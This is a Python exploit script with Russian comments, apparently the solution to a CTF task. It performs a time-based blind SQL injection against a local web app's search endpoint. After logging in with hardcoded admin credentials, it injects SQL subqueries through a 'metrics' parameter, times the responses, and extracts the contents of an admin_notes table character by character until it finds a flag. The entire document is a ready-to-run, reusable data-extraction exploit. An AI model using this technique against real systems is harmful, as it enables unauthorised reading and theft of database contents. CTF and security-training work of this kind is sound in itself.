#!/usr/bin/env python3
"""
Пример эксплуатации Blind SQL Injection для CTF таска
Этот скрипт демонстрирует, как можно извлечь данные из базы данных
используя time-based blind SQL injection.
"""

import requests
import time
import string

# Конфигурация
BASE_URL = "http://localhost:5000"
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "admin123!"

# Сессия для поддержания cookies
session = requests.Session()

def login():
    """Вход в систему как администратор"""
    login_data = {
        "username": ADMIN_USERNAME,
        "password": ADMIN_PASSWORD
    }
    
    response = session.post(f"{BASE_URL}/login", json=login_data)
    return response.json().get('success', False)

def test_blind_sqli(payload):
    """
    Тестирует blind SQL injection с time-based атакой
    Возвращает True, если запрос выполнился с задержкой
    """
    start_time = time.time()
    
    # Отправляем запрос с payload в интегрированный time-канал поиска
    response = session.get(f"{BASE_URL}/search", params={"q": "a", "metrics": payload})
    
    end_time = time.time()
    response_time = end_time - start_time
    
    # Порог задержки зависит от контейнера/железа; возьмём консервативно
    return response_time > 1.5

def extract_data_length(table_name, column_name, condition=""):
    """Извлекает длину данных из указанной колонки"""
    print(f"[*] Определяем длину данных в {table_name}.{column_name}")
    
    # Бинарный поиск длины
    low, high = 1, 100
    while low <= high:
        mid = (low + high) // 2
        
        payload = f"(SELECT LENGTH({column_name}) FROM {table_name} {condition}) {'=' if mid == low else '>='} {mid}"
        
        if test_blind_sqli(payload):
            if mid == low:
                return mid
            low = mid + 1
        else:
            high = mid - 1
    
    return low

def extract_data(table_name, column_name, data_length, condition=""):
    """Извлекает данные посимвольно"""
    print(f"[*] Извлекаем данные из {table_name}.{column_name} (длина: {data_length})")
    
    result = ""
    charset = string.ascii_letters + string.digits + "{}_!@#$%^&*()"
    
    for position in range(1, data_length + 1):
        print(f"[*] Позиция {position}/{data_length}")
        
        for char in charset:
            payload = f"(SELECT SUBSTR({column_name},{position},1) FROM {table_name} {condition})='{char}'"
            
            if test_blind_sqli(payload):
                result += char
                print(f"[+] Найден символ: {char} (позиция {position})")
                break
        else:
            result += "?"
            print(f"[-] Не удалось определить символ на позиции {position}")
    
    return result

def main():
    print("[*] Запуск эксплуатации Blind SQL Injection")
    print("=" * 50)
    
    # Входим в систему
    print("[*] Вход в систему...")
    if not login():
        print("[-] Не удалось войти в систему")
        return
    
    print("[+] Успешный вход в систему")
    
    # Проверяем существование таблицы admin_notes
    print("\n[*] Проверяем существование таблицы admin_notes...")
    payload = "(SELECT COUNT(*) FROM sqlite_master WHERE name='admin_notes')>0"
    if test_blind_sqli(payload):
        print("[+] Таблица admin_notes существует")
    else:
        print("[-] Таблица admin_notes не найдена")
        return
    
    # Определяем количество записей в таблице
    print("\n[*] Определяем количество записей в admin_notes...")
    payload = "(SELECT COUNT(*) FROM admin_notes)>0"
    if test_blind_sqli(payload):
        print("[+] В таблице admin_notes есть записи")
    else:
        print("[-] Таблица admin_notes пуста")
        return
    
    # Извлекаем заметки
    print("\n[*] Извлекаем заметки из admin_notes...")
    
    # Сначала определим количество записей
    record_count = 0
    for i in range(1, 10):  # Предполагаем максимум 10 записей
        payload = f"(SELECT COUNT(*) FROM admin_notes)>={i}"
        if test_blind_sqli(payload):
            record_count = i
        else:
            break
    
    print(f"[+] Найдено {record_count} записей")
    
    # Извлекаем каждую заметку
    for record_id in range(1, record_count + 1):
        print(f"\n[*] Извлекаем заметку #{record_id}")
        
        # Определяем длину заметки
        note_length = extract_data_length("admin_notes", "note", f"WHERE rowid = {record_id}")
        print(f"[+] Длина заметки #{record_id}: {note_length}")
        
        # Извлекаем заметку
        note = extract_data("admin_notes", "note", note_length, f"WHERE rowid = {record_id}")
        print(f"[+] Заметка #{record_id}: {note}")
        
        # Проверяем, содержит ли заметка флаг
        if "CTF{" in note:
            print(f"\n[!] НАЙДЕН ФЛАГ: {note}")
            break
    
    print("\n[*] Эксплуатация завершена")

if __name__ == "__main__":
    main()
